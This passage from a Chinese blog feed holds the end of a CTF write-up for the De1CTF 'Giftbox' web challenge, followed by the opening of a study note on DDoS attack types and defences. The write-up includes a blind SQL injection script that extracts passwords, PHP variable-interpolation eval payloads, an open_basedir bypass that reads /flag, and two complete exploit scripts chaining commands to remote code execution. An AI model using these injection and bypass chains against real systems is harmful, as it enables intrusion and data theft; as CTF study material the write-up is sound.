"select/**/count(*)/**/from/**/users"</span></span><br><span class="line">    <span class="comment"># db_numbers = half(db_nums_payload)</span></span><br><span class="line">    <span class="comment"># print("长度为：%d" % db_numbers)</span></span><br><span class="line"></span><br><span class="line">    db_payload = <span class="string">"select/**/concat(password)/**/from/**/users"</span></span><br><span class="line">    db_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        db_name_payload = <span class="string">"ascii(substr(("</span> + db_payload + <span class="string">"),%d,1))"</span> % (y)</span><br><span class="line">        db_name += chr(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"值："</span> + db_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二分法函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s/**/&gt;/**/%d"</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>同样会得到密码: <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p><hr><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br><span class="line">login success.</span><br></pre></td></tr></table></figure></div><p>然后试一下 <code>targeting</code> <code>launch</code> <code>destruct</code> 等等命令</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" class="lazyload"></a></p><p>以及 <code>hint</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named <span class="string">'eval'</span> when launching missiles.</span><br></pre></td></tr></table></figure></div><p>看到 <code>eval</code> 知道考点是RCE代码注入<br>然后网上找到了这个<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">从一道题讲PHP复杂变量</a></p><ul><li>php会处理双引号里面的东西，所以：</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"abc"</span>;</span><br><span class="line">$b=<span class="string">"$a"</span>;  输出abc</span><br><span class="line">$b=<span class="string">"\$a"</span>; 输出$a</span><br><span class="line">$b=<span class="string">'$a'</span>;  输出$a</span><br></pre></td></tr></table></figure></div><ul><li>如果 <code>{</code> 和 <code>$</code> 紧挨着也会表示一个变量</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$great = <span class="string">'fantastic'</span>;</span><br><span class="line"></span><br><span class="line">无效，输出: This is &#123; fantastic&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is &#123; $great&#125;"</span>;</span><br><span class="line"></span><br><span class="line">有效，输出： This is fantastic</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is &#123;$great&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is $&#123;great&#125;"</span>;</span><br></pre></td></tr></table></figure></div><ul><li>bypass<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"$&#123;phpinfo()&#125;"</span>;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">$a=$&#123;phpinfo()&#125;;</span><br></pre></td></tr></table></figure></div></li></ul><p>照着上面的思路 </p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" data-fancybox="group" data-caption="gift9_2" class="fancybox"><img alt="gift9_2" title="gift9_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" class="lazyload"></a></p><p>将 <code>Error</code> 的 内容保存本地 可以看到就是 <code>phpinfo</code></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" class="lazyload"></a></p><p>可以看到 <code>open_basedir</code> 限制了路径<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" class="lazyload"></a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" class="lazyload"></a></p><p>然后看一下其他过滤</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" class="lazyload"></a></p><p><strong><font color="6495ED">code</font></strong> 长度限制2位</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" class="lazyload"></a></p><p><strong><font color="6495ED">position</font></strong> 长度限制12位，同样都存在 <code>\</code> 的过滤(其实也简单，用 <code>chr()</code> 绕过)</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" class="lazyload"></a></p><p>总结一下运行过程</p><ul><li><font color="6495ED">targeting code position</font> -&gt; 储存一条 <code>$code = &quot;position&quot;</code>;</li><li><font color="6495ED">launch</font> -&gt; 将上面 <code>targeting</code> 的 <code>code</code>  按照字典顺序跑一遍</li><li><font color="6495ED">destuct</font> -&gt; 全部清空，恢复初始状态</li></ul><p>然后按照上面 <a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">open_basedir绕过</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure></div><h2 id="最后exp"><a href="#最后exp" class="headerlink" title="最后exp"></a>最后exp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>,</span><br><span class="line">                    params=&#123;<span class="string">'a'</span>: <span class="string">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code, position)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'targeting '</span> + code + <span class="string">' '</span> + position, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'launch'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destuct</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = session.get(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'destruct'</span>, <span class="string">'totp'</span>: totp.now()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    login()</span><br><span class="line">    destuct()</span><br><span class="line">    targeting(<span class="string">"a"</span>, <span class="string">"chdir"</span>)</span><br><span class="line">    targeting(<span class="string">"b"</span>, <span class="string">"img"</span>)</span><br><span class="line">    targeting(<span class="string">"c"</span>, <span class="string">"&#123;$a($b)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"d"</span>, <span class="string">"ini_set"</span>)</span><br><span class="line">    targeting(<span class="string">"e"</span>, <span class="string">"open_basedir"</span>)</span><br><span class="line">    targeting(<span class="string">"f"</span>, <span class="string">".."</span>)</span><br><span class="line">    targeting(<span class="string">"g"</span>, <span class="string">"&#123;$d($e,$f)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"h"</span>, <span class="string">"&#123;$a($f)&#125;"</span>)</span><br><span class="line">    targeting(<span class="string">"i"</span>, <span class="string">"&#123;$a($f)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"j"</span>, <span class="string">"Ly8v"</span>)</span><br><span class="line">    targeting(<span class="string">"k"</span>, <span class="string">"base64_"</span>)</span><br><span class="line">    targeting(<span class="string">"l"</span>, <span class="string">"decode"</span>)</span><br><span class="line">    targeting(<span class="string">"m"</span>, <span class="string">"$k$l"</span>)</span><br><span class="line">    targeting(<span class="string">"n"</span>, <span class="string">"&#123;$m($j)&#125;"</span>)</span><br><span class="line">    targeting(<span class="string">"o"</span>, <span class="string">"&#123;$d($e,$n)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"p"</span>, <span class="string">"flag"</span>)</span><br><span class="line">    targeting(<span class="string">"q"</span>, <span class="string">"file_get"</span>)</span><br><span class="line">    targeting(<span class="string">"r"</span>, <span class="string">"_contents"</span>)</span><br><span class="line">    targeting(<span class="string">"s"</span>, <span class="string">"$q$r"</span>)</span><br><span class="line"></span><br><span class="line">    targeting(<span class="string">"t"</span>, <span class="string">"&#123;$s($p)&#125;"</span>)</span><br><span class="line"></span><br><span class="line">    print(launch())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">totp=pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">url=<span class="string">'http://link-site/shell.php'</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">'a'</span>:<span class="string">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>,</span><br><span class="line">        <span class="string">'totp'</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url,params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'destruct'</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    s.get(url, params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'launch'</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now(),</span><br><span class="line">        <span class="comment">#'w':'''print_r(scandir('.'));'''</span></span><br><span class="line">        <span class="comment">#img是当前目录的一个文件夹，也可以改为其他当前目录文件夹</span></span><br><span class="line">        <span class="string">'w'</span>: <span class="string">'''chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile('/flag');'''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(code,pos)</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'targeting &#123;&#125; &#123;&#125;'</span>.format(code,pos),</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.get(url, params=params)</span><br><span class="line">print(login().text)</span><br><span class="line"><span class="comment">###phpinfo测试</span></span><br><span class="line"><span class="comment">#targeting('a','phpinfo')</span></span><br><span class="line"><span class="comment">#targeting('b','&#123;$a()&#125;')</span></span><br><span class="line"><span class="comment">#print(launch().text)</span></span><br><span class="line">destruct()</span><br><span class="line">targeting(<span class="string">'a'</span>,<span class="string">'&#123;$_GET&#123;w&#125;&#125;'</span>)</span><br><span class="line">targeting(<span class="string">'b'</span>,<span class="string">'$&#123;eval($a)&#125;'</span>)</span><br><span class="line">print(launch().text)</span><br></pre></td></tr></table></figure></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/wuyanxin/totp.js" target="_blank" rel="noopener">TOTP作者算法</a><br><a href="https://blog.csdn.net/chasingin/article/details/104642522/" target="_blank" rel="noopener">W4nder师傅的wp</a><br><a href="https://xz.aliyun.com/t/5967" target="_blank" rel="noopener">浅析DelCTF web之Giftbox题解</a><br><a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">赵总的wp</a><br><a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">从一道题讲PHP复杂变量</a><br><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedir的新方法</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
      <category term="write up" scheme="https://manayakko.github.io/yakko117/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>DDoS原理与防御</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/29/Ddos%E5%AD%A6%E4%B9%A0/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/29/Ddos%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-29T11:18:13.841Z</published>
    <updated>2020-03-31T14:03:09.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>感觉自己最近很颓废，因为一点小事就想着逃避，然后摸鱼摸一天<br>为什么要写这篇，主要是因为考试考到了，所以记录学习一下<br>                                – 懒狗发言</p><h1 id="DDoS简介"><a href="#DDoS简介" class="headerlink" title="DDoS简介"></a>DDoS简介</h1><p><strong>DDoS(Distributed Denial of Service)</strong>，又称分布式拒绝服务攻击。<br>通过控制多个肉鸡或服务器组成的僵尸网络，对目标发送大量看似合法请求，从而占用大量网络资源，瘫痪网络，阻止用户对网络资源o的正常访问。</p><h2 id="DDoS危害"><a href="#DDoS危害" class="headerlink" title="DDoS危害"></a>DDoS危害</h2><p>出口带宽堵死<br>游戏掉线导致客户流失<br>服务器连接数多，连接资源被耗尽<br>服务器卡、慢、死机、无法连接</p><h2 id="攻击来源"><a href="#攻击来源" class="headerlink" title="攻击来源"></a>攻击来源</h2><p>高性能服务器配合发包软件<br>可联网的设备(如打印机、摄像头、电视等等)<br>移动设备(数量多，增长速度快，其高性能利于组建僵尸网络)<br>个人PC(存在漏洞的PC或一些黑客迷自愿成为DDOS一员)<br>骇客控制的僵尸网络(僵尸网络又分为IRC型、HTTP型、P2P型)</p><h2 id="流量特点"><a href="#流量特点" class="headerlink" title="流量特点"></a>流量特点</h2><p>IP地址随机或固定某些IP段随机<br>没有完整完成三次握手<br>地址多数是伪造的<br>请求数量大、快</p><h2 id="导致DDoS原因"><a href="#导致DDoS原因" class="headerlink" title="导致DDoS原因"></a>导致DDoS原因</h2><p>个人因素：金钱利益 政治冲突 宗教冲突 为求出名</p><p>服务带宽上限 网络协议存在缺陷<br>服务器设备性能上限<br>应用性能上限<br>系统性能上限</p><hr><h1 id="攻击类型及防御"><a href="#攻击类型及防御" class="headerlink" title="攻击类型及防御"></a>攻击类型及防御</h1><h2 id="Smurf-Attack"><a href="#Smurf-Attack" class="headerlink" title="Smurf Attack"></a>Smurf Attack</h2><p>攻击者向网关发送 <code>ICMP请求包</code>，并将该 <code>ICMP请求报文的源地址</code> 伪造成 <code>受害主机IP地址</code>，目的地址为广播地址。<br>路由器在接受到该数据包，发现目的地址是<strong>广播地址</strong>，就会将该数据包广播出去，局域网内所有的 <strong>存活主机</strong> 都会受到一个 <code>ICMP请求包</code>，<strong>源地址是受害主机IP</strong>。接下来受害主机就会收到该网络内所有主机发来的 <code>ICMP应答报文</code> ，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" data-fancybox="group" data-caption="ddos_1" class="fancybox"><img alt="ddos_1" title="ddos_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_1.png" class="lazyload"></a></p><p>防护方案：</p><ul><li>禁止路由器广播ICMP请求包；</li><li>禁止操作系统对广播发出的ICMP请求包做出响应；</li><li>配置防火墙静止来自你所处网络外部的ping包</li></ul><hr><h2 id="TearDrop-Attack"><a href="#TearDrop-Attack" class="headerlink" title="TearDrop Attack"></a>TearDrop Attack</h2><p>在了解这种攻击之前，需要先知道什么是 <code>IP fragmentation(数据包分片)</code>。数据在网络中传输必定会产生数据包被分片，因为每种网络都有不同的最大单个数据包的大小，也就是常说的 <code>MTU (Maximum Transmission Unit，最大传输单元)</code>。当要传输的数据超过你要通信的那台主机所处网络的MTU时，数据包就会被分片进行传输，然后在到达目的地再重新组装成原来的数据包，下面是数据包分片重组过程</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" data-fancybox="group" data-caption="ddos_2" class="fancybox"><img alt="ddos_2" title="ddos_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_2.png" class="lazyload"></a></p><p><code>TearDrop Attack</code>，就是通过设置错误的片偏移，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" data-fancybox="group" data-caption="ddos_3" class="fancybox"><img alt="ddos_3" title="ddos_3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_3.png" class="lazyload"></a></p><p>对比一下正常IP数据包和错误IP数据包</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" data-fancybox="group" data-caption="ddos_4" class="fancybox"><img alt="ddos_4" title="ddos_4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_4.png" class="lazyload"></a></p><p>这种攻击主要对旧的windows版本和Linux版本有效，防护的话，可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。例如这个：<a href="https://wenku.baidu.com/view/b45bba61ddccda38376baf7f.html" target="_blank" rel="noopener">分片重组检查算法 &lt;- link</a>。</p><p>网络安全设备将接收到的<strong>分片报文</strong>先放入<strong>缓存</strong>中，并根据<strong>源IP地址</strong>和<strong>目的IP地址</strong>对报文进行分组，源IP地址和目的IP地址均相同的报文归入同一组，然后对每组IP报文的相关分片信息进行检查，<strong>丢弃分片信息存在错误的报文</strong>。为了防止缓存益处，当缓存快要存满是，直接丢弃后续分片报文。</p><hr><h2 id="Land-Attack"><a href="#Land-Attack" class="headerlink" title="Land Attack"></a>Land Attack</h2><p>攻击者发动 <code>Land Attack</code> 攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。攻击过程如下</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" data-fancybox="group" data-caption="ddos_5" class="fancybox"><img alt="ddos_5" title="ddos_5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_5.png" class="lazyload"></a></p><p><strong>防御方案</strong>:</p><ul><li>通过<strong>设置防火墙和路由规则</strong>，检测源IP与目的IP相同的数据包，丢弃、过滤这种数据包。(类似上述的 <font color="6495ED">TearDrop Attack</font>)</li></ul><hr><h2 id="SYN-flood-attack-几个值得了解的关键点来了"><a href="#SYN-flood-attack-几个值得了解的关键点来了" class="headerlink" title="SYN flood attack (几个值得了解的关键点来了)"></a>SYN flood attack (几个值得了解的关键点来了)</h2><p><code>SYN flood attack</code> 是在TCP三次握手过程中产生的。攻击者通过发送大量伪造的带有<font color="6495ED">SYN标志位的TCP报文</font>，与目标主机建立了很多虚假的<strong>半开连接</strong>，在服务器返回<font color="6495ED">SYN+ACK数据包</font>后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" data-fancybox="group" data-caption="ddos_6" class="fancybox"><img alt="ddos_6" title="ddos_6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" class="lazyload"></a></p><p><strong>防御方案</strong>:</p><ul><li><p><font color="6495ED">SYN Check</font>：使用防护设备，<strong>3次握手变成了6次握手</strong>，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。</p></li><li><p><font color="6495ED">Micro 